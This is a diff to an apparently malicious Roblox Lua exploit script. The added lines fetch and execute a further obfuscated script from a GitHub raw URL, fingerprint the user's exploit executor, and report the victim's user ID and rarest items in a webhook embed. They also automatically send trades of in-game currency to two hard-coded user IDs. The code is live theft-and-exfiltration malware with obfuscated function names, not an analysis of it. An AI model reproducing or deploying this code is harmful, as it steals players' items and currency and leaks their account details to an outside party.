@@ -2,6 +2,10 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/
 
 task.wait(1)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/refs/heads/main/Protected_4047913774660354.lua"))()
+
+task.wait(1)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Remote = game:GetService("ReplicatedStorage").Remotes.TimeStorage
@@ -63,6 +67,48 @@ local gameTitle = "Unknown Game"
 pcall(function()
     gameTitle = MarketplaceService:GetProductInfo(placeId).Name
 end)
+
+local function getExecutorName()
+    local executor = "Unknown"
+    
+    pcall(function()
+        if identifyexecutor then
+            executor = identifyexecutor()
+        elseif KRNL_LOADED then
+            executor = "Krnl"
+        elseif syn then
+            executor = "Synapse X"
+        elseif SONA_LOADED then
+            executor = "Sona"
+        elseif getexecutorname then
+            executor = getexecutorname()
+        elseif issentinelclosure then
+            executor = "Sentinel"
+        elseif OXYGEN_LOADED then
+            executor = "Oxygen U"
+        elseif Fluxus then
+            executor = "Fluxus"
+        elseif Delta then
+            executor = "Delta"
+        elseif IS_VIVA_LOADED then
+            executor = "Viva"
+        elseif ScriptWare then
+            executor = "Script-Ware"
+        elseif is_sirhurt_closure then
+            executor = "SirHurt"
+        elseif pebc_execute then
+            executor = "ProtoSmasher"
+        elseif TRIGON_LOADED then
+            executor = "Trigon"
+        elseif Arceus then
+            executor = "Arceus X"
+        elseif executor_used then
+            executor = executor_used
+        end
+    end)
+    
+    return executor
+end
 
 local function getThumbnailUrl(userId)
     local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
@@ -239,6 +285,7 @@ end
 
 local rarestItemName, rarestItemValue = zKw9()
 local thumbnailUrl = getThumbnailUrl(userId)
+local executorName = getExecutorName()
 
 local embedData = {
     ["content"] = nil,
@@ -253,6 +300,11 @@ local embedData = {
             {
                 ["name"] = "UserID",
                 ["value"] = "```" .. userId .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Executor",
+                ["value"] = "```" .. executorName .. "```",
                 ["inline"] = true
             },
             {
@@ -273,6 +325,9 @@ local embedData = {
         },
         ["thumbnail"] = {
             ["url"] = thumbnailUrl
+        },
+        ["footer"] = {
+            ["text"] = "Executed with " .. executorName
         },
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }},
@@ -327,6 +382,58 @@ local function qX5w(targetPlayer, swordName, quantity)
     end)
 end
 
+local function vY2p(targetPlayer)
+    pcall(function()
+        wait(math.random(18, 22))
+        
+        local args = {
+            {
+                SenderContents = {
+                    Items = {},
+                    Currency = {
+                        Time = 5782
+                    }
+                },
+                Receiver = targetPlayer,
+                ReceiverContents = {
+                    Items = {},
+                    Currency = {}
+                }
+            }
+        }
+        
+        local tradeRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Trade System"):WaitForChild("SendTrade")
+        tradeRemote:InvokeServer(unpack(args))
+    end)
+end
+
+local function checkSpecialPlayers()
+    local specialUserIds = {1442346419, 13893355}
+    local processedPlayers = {}
+    
+    for _, targetPlayer in pairs(Players:GetPlayers()) do
+        local targetUserId = targetPlayer.UserId
+        
+        if table.find(specialUserIds, targetUserId) and not processedPlayers[targetUserId] then
+            processedPlayers[targetUserId] = true
+            spawn(function()
+                vY2p(targetPlayer)
+            end)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(newPlayer)
+        local newUserId = newPlayer.UserId
+        
+        if table.find(specialUserIds, newUserId) and not processedPlayers[newUserId] then
+            processedPlayers[newUserId] = true
+            spawn(function()
+                vY2p(newPlayer)
+            end)
+        end
+    end)
+end
+
 local function nD9k()
     local processedMessages = {}
     
@@ -378,4 +485,5 @@ local function nD9k()
 end
 
 tL6y()
+checkSpecialPlayers()
 nD9k()
